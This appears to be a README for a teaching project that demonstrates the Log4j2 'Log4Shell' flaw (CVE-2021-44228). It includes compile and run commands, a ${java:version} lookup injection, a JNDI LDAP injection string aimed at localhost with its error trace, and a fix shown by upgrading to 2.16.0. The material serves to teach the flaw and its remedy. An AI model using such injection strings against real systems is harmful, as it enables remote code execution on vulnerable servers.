# log4j-vul
This project is just to show Apache Log4j2 Vulnerability - aka CVE-2021-44228

Java:
========
java version "1.8.0_121"

Compile:
========
(from src folder)
javac -classpath .;..\lib\log4j-api-2.1.jar;..\lib\log4j-core-2.1.jar com\example\Log4jVul.java

Execute\Run:
=============
(from src folder)
java -classpath .;..\lib\log4j-api-2.1.jar;..\lib\log4j-core-2.1.jar com.example.Log4jVul Bhanu

Output:
ERROR StatusLogger No log4j2 configuration file found. Using default configuration: logging only errors to the console.
11:29:08.081 [main] ERROR com.example.Log4jVul - ** Username: Bhanu**

Vulnerability show:
===================
(from src folder)
java -classpath .;..\lib\log4j-api-2.1.jar;..\lib\log4j-core-2.1.jar com.example.Log4jVul ${java:version}

Output:
ERROR StatusLogger No log4j2 configuration file found. Using default configuration: logging only errors to the console.
11:34:04.110 [main] ERROR com.example.Log4jVul - ** Username: Java version 1.8.0_121**

NOTICE: output is "Java version 1.8.0_121" ********************

Vulnerability show (JNDI):
=========================
(from src folder)
java -classpath .;..\lib\log4j-api-2.1.jar;..\lib\log4j-core-2.1.jar  -Dlog4j.configurationFile=log4j2.properties com.example.Log4jVul ${jndi:ldap://localhost:8181/Exploit}

Note: Please read about Java Unmarshaller Security - Turning your data into code execution. https://github.com/mbechler/marshalsec

Output:
2021-12-22 10:04:25,803 WARN Error looking up JNDI resource [ldap://localhost:8181/Exploit]. javax.naming.ServiceUnavailableException: localhost:8181; socket closed
        at com.sun.jndi.ldap.Connection.readReply(Connection.java:454)
        at com.sun.jndi.ldap.LdapClient.ldapBind(LdapClient.java:365)
        at com.sun.jndi.ldap.LdapClient.authenticate(LdapClient.java:192)
        at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2788)
        at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:319)
        at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)
        at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)
        at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202)
        at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
        at javax.naming.InitialContext.lookup(InitialContext.java:417)
        at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:128)
        at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:55)
        at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:153)
        at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1041)
        at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:957)
        at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:847)
        at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:402)
        at org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:71)
        at org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:36)
        at org.apache.logging.log4j.core.layout.PatternLayout.toSerializable(PatternLayout.java:197)
        at org.apache.logging.log4j.core.layout.PatternLayout.toSerializable(PatternLayout.java:55)
        at org.apache.logging.log4j.core.layout.AbstractStringLayout.toByteArray(AbstractStringLayout.java:67)
        at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:108)
        at org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:99)
        at org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:430)
        at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:409)
        at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:367)
        at org.apache.logging.log4j.core.Logger.logMessage(Logger.java:112)
        at org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:727)
        at org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:716)
        at org.apache.logging.log4j.spi.AbstractLogger.error(AbstractLogger.java:344)
        at com.example.Log4jVul.main(Log4jVul.java:16)

10:04:25.779 [main] ERROR com.example.Log4jVul - ** Username: ${jndi:ldap://localhost:8181/Exploit}**

Fixing with version Log4j 2.16.0
================================
Compile:
========
(from src folder)
javac -classpath .;..\lib\log4j-api-2.16.0.jar;..\lib\log4j-core-2.16.0.jar com\example\Log4jVul.java

Execute\Run:
============
(from src folder)
java -classpath .;..\lib\log4j-api-2.16.0.jar;..\lib\log4j-core-2.16.0.jar com.example.Log4jVul ${java:version}

Output:
11:42:48.815 [main] ERROR com.example.Log4jVul - ** Username: ${java:version}**


